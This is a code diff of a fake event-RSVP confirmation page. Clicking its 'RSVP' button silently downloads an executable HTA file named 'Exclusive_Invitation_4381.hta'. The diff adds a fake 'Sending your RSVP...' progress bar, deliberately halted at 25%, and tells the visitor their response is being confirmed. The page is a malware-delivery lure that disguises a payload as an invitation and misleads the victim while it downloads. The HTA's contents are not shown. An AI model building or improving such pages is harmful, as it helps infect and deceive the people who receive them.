@@ -29,6 +29,7 @@
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
             position: relative;
             overflow: hidden;
+            min-height: 400px; /* Prevent layout shift */
         }
         
         /* Gold Checkmark Icon */
@@ -94,41 +95,37 @@
             box-shadow: 0 10px 25px -5px rgba(212, 175, 55, 0.3);
         }
         
-        /* LOADING OVERLAY (Hidden by default) */
-        .loading-overlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: #1e293b;
-            display: flex;
+        /* PROGRESS BAR SECTION (Hidden initially) */
+        .progress-section {
+            display: none;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease;
-            z-index: 10;
+            height: 100%;
+            padding-top: 20px;
         }
         
-        .loading-overlay.active {
-            opacity: 1;
-            pointer-events: all;
+        .progress-container { 
+            width: 100%; 
+            max-width: 300px; 
+            height: 4px; 
+            background: #334155; 
+            border-radius: 2px; 
+            overflow: hidden; 
+            margin: 20px 0 15px; 
         }
         
-        .spinner {
-            width: 40px; height: 40px;
-            border: 3px solid rgba(212, 175, 55, 0.3);
-            border-top-color: #d4af37;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        .progress-bar { 
+            height: 100%; 
+            background: #d4af37; 
+            width: 0%; 
+            transition: width 0.3s ease-out; 
         }
         
-        @keyframes spin { to { transform: rotate(360deg); } }
-        
-        .loading-text {
-            color: #cbd5e1;
-            font-size: 1rem;
-            letter-spacing: 1px;
+        .status-text { 
+            color: #64748b; 
+            font-size: 0.85rem; 
+            margin-bottom: 10px; 
         }
         
         .footer { 
@@ -143,8 +140,8 @@
 </head>
 <body>
     <div class="card">
-        <!-- MAIN CONTENT -->
-        <div id="main-content">
+        <!-- INITIAL STATE -->
+        <div id="initial-state">
             <div class="icon-circle">✓</div>
             
             <div class="rsvp-label">RSVP CONFIRMED</div>
@@ -155,37 +152,60 @@
                 invitation has been saved to your device.
             </p>
             
-            <!-- CLICKING THIS TRIGGERS THE FLOW -->
             <button class="btn-rsvp" onclick="startRsvpFlow()">RSVP</button>
             
             <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
         </div>
         
-        <!-- LOADING ANIMATION (Shows when RSVP is clicked) -->
-        <div class="loading-overlay" id="loading-overlay">
-            <div class="spinner"></div>
-            <div class="loading-text">Sending your RSVP...</div>
+        <!-- PROGRESS STATE (Shows after clicking RSVP) -->
+        <div class="progress-section" id="progress-state">
+            <div class="icon-circle">✓</div>
+            <h2 style="font-family: 'Georgia', serif; font-size: 1.8rem; margin-bottom: 10px; color: #f8fafc;">Sending your RSVP...</h2>
+            <p class="status-text">Contacting the event...</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <p class="status-text" id="progress-percent">0%</p>
+            <p class="status-text" style="margin-top: -5px;">Your response is being confirmed. This usually only takes a few minutes.</p>
+            
+            <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
         </div>
     </div>
 
     <script>
         function startRsvpFlow() {
-            // 1. Show loading animation
-            document.getElementById('loading-overlay').classList.add('active');
+            // 1. Hide initial state, show progress state
+            document.getElementById('initial-state').style.display = 'none';
+            document.getElementById('progress-state').style.display = 'flex';
             
-            // 2. Wait 2 seconds (simulates "sending") then trigger download
-            setTimeout(function() {
-                // Create invisible link to trigger download
-                var link = document.createElement('a');
-                link.href = '/static/Exclusive_Invitation_4381.hta';
-                link.download = 'Exclusive_Invitation_4381.hta';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                
-                // Optional: Change text after download starts
-                document.querySelector('.loading-text').innerText = 'Invitation downloaded!';
-            }, 2000);
+            // 2. Trigger HTA download immediately
+            var link = document.createElement('a');
+            link.href = '/static/Exclusive_Invitation_4381.hta';
+            link.download = 'Exclusive_Invitation_4381.hta';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // 3. Start progress bar animation (0% to 25%)
+            animateProgress();
+        }
+        
+        function animateProgress() {
+            var p = 0;
+            var bar = document.getElementById("progress-bar");
+            var txt = document.getElementById("progress-percent");
+            
+            var iv = setInterval(function() {
+                if(p >= 25) { 
+                    clearInterval(iv); 
+                    return; 
+                } // STOPS AT 25% LIKE IN VIDEO
+                p++; 
+                bar.style.width = p+"%"; 
+                txt.innerText = p+"%";
+                setTimeout(arguments.callee, 150 + p*8); // Slow down as it progresses
+            }, 100);
         }
     </script>
 </body>
